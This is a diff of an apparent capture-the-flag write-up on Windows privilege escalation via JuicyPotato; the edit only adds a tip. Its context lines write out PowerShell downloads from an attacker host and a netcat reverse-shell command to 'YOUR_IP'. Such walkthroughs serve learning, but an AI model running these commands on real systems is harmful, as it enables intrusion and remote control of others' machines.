@@ -80,7 +80,7 @@ So we have the SeImpersonatePrivilege ENABLED, [juicy potato](https://github.com
 Let’s upload nc64.exe and JuicyPotato.exe to the machine (don’t forget to set a http server)
 - powershell -c "(New-Object Net.Webclient).DownloadFile('http://YOUR_IP/nc64.exe','C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\nc64.exe')"
 - powershell -c "(New-Object Net.Webclient).DownloadFile('http://YOUR_IP/JuicyPotato.exe','C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\jp.exe')"  
-PS: you can find the nc64.exe on internet, just google it
+PS: you can find the nc64.exe on internet, just google it (Tip: github)
 
 Now we create a bat file, which will be executed by the juicypotato:
 - echo start C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\nc64.exe -e cmd.exe YOUR_IP 9003 > eldruin.bat
